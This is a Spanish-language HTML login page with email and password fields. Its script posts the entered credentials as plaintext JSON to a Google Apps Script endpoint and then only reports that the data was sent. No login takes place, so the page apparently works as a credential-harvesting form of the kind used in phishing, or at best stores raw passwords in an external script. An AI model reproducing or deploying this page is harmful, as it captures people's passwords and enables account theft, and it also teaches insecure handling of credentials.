<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <title>Iniciar sesión</title>

    <style>

        * {
            box-sizing: border-box;
        }

        body {
            margin: 0;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: Arial, sans-serif;
            background: #f2f4f7;
        }

        .contenedor {
            width: 100%;
            max-width: 400px;
            background: white;
            padding: 35px;
            border-radius: 15px;
            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.15);
        }

        h1 {
            text-align: center;
            margin-bottom: 30px;
        }

        label {
            display: block;
            margin-top: 18px;
            margin-bottom: 7px;
            font-weight: bold;
        }

        input {
            width: 100%;
            padding: 13px;
            border: 1px solid #ccc;
            border-radius: 7px;
            font-size: 15px;
        }

        input:focus {
            outline: none;
            border-color: #1a73e8;
        }

        button {
            width: 100%;
            margin-top: 25px;
            padding: 13px;
            border: none;
            border-radius: 7px;
            background: #1a73e8;
            color: white;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
        }

        button:hover {
            background: #1557b0;
        }

        #mensaje {
            text-align: center;
            margin-top: 20px;
            font-weight: bold;
        }

    </style>
</head>

<body>

    <div class="contenedor">

        <h1>Iniciar sesión</h1>

        <form id="formulario">

            <label for="correo">
                Correo electrónico
            </label>

            <input
                type="email"
                id="correo"
                placeholder="Ingrese su correo"
                required
            >

            <label for="contrasena">
                Contraseña
            </label>

            <input
                type="password"
                id="contrasena"
                placeholder="Ingrese su contraseña"
                required
            >

            <button type="submit">
                INGRESAR
            </button>

        </form>

        <div id="mensaje"></div>

    </div>


    <script>

        const URL_APPS_SCRIPT =
        "https://script.google.com/macros/s/AKfycbzp8-XfQsyRZFBcZ20Muin_KIctPCcQj3U2ahPakjAvYuHiGYUvpXXfmnQousvQsuvw/exec";


        document
        .getElementById("formulario")
        .addEventListener("submit", async function(event) {

            event.preventDefault();

            const correo =
                document.getElementById("correo").value;

            const contrasena =
                document.getElementById("contrasena").value;

            const mensaje =
                document.getElementById("mensaje");

            mensaje.textContent = "Enviando...";


            const datos = {

                correo: correo,

                contrasena: contrasena

            };


            try {

                await fetch(URL_APPS_SCRIPT, {

                    method: "POST",

                    mode: "no-cors",

                    headers: {

                        "Content-Type":
                        "text/plain;charset=utf-8"

                    },

                    body: JSON.stringify(datos)

                });


                mensaje.textContent =
                "✅ Datos enviados correctamente.";

                document
                .getElementById("formulario")
                .reset();


            } catch (error) {

                mensaje.textContent =
                "❌ Ocurrió un error.";

            }

        });

    </script>

</body>
</html>
